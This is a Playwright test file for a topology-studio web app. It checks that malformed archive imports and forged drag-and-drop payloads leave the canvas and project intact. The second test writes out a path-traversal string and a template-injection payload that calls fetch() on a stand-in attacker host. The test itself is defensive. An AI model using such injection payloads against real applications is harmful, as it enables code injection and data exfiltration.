import { expect, test } from '@playwright/test';
import { activateStudioPaletteTemplate } from '../support/workbench';

test('contains repeated malformed archive imports without replacing the active project', async ({ page }) => {
  await page.goto('/');
  await activateStudioPaletteTemplate(page, 'router');
  const projectButton = page.getByRole('button', { name: 'Project menu' });
  const projectName = await projectButton.textContent();

  for (let attempt = 0; attempt < 3; attempt += 1) {
    await projectButton.click();
    const menu = page.getByRole('dialog', { name: 'Projects' });
    const [chooser] = await Promise.all([page.waitForEvent('filechooser'), menu.getByRole('button', { name: 'Open archive' }).click()]);
    await chooser.setFiles({
      buffer: Buffer.from([0x50, 0x4b, attempt, 0xff]),
      mimeType: 'application/zip',
      name: `malformed-${attempt}.tvstudio`
    });
    await expect(menu).toBeHidden();
    await expect(projectButton).toHaveText(projectName || 'Untitled topology');
    await expect(page.locator('.react-flow__node')).toHaveCount(4);
    await expect(page.locator('.react-flow__renderer')).toBeVisible();
  }

  await projectButton.click();
  await expect(page.getByRole('dialog', { name: 'Projects' }).getByRole('alert')).toBeVisible();
});

test('ignores forged drag payloads without mutating or blanking the canvas', async ({ page }) => {
  await page.goto('/?__studio-test-state=starter');
  await activateStudioPaletteTemplate(page, 'router');
  await expect(page.locator('.react-flow__node')).toHaveCount(1);

  await page.getByTestId('studio-canvas').evaluate((canvas) => {
    const invalidObject = new DataTransfer();
    invalidObject.setData('application/x-topoviewer-object', '../../../host-command');
    canvas.dispatchEvent(
      new DragEvent('drop', {
        bubbles: true,
        cancelable: true,
        clientX: 200,
        clientY: 200,
        dataTransfer: invalidObject
      })
    );

    const invalidMetric = new DataTransfer();
    invalidMetric.setData('application/x-topoviewer-metric', '${globalThis.fetch("https://attacker.invalid")}');
    canvas.dispatchEvent(
      new DragEvent('drop', {
        bubbles: true,
        cancelable: true,
        clientX: 240,
        clientY: 240,
        dataTransfer: invalidMetric
      })
    );
  });

  await expect(page.locator('.react-flow__node')).toHaveCount(1);
  await expect(page.locator('.react-flow__renderer')).toBeVisible();
  await expect(page.getByTestId('studio-canvas')).toBeVisible();
});
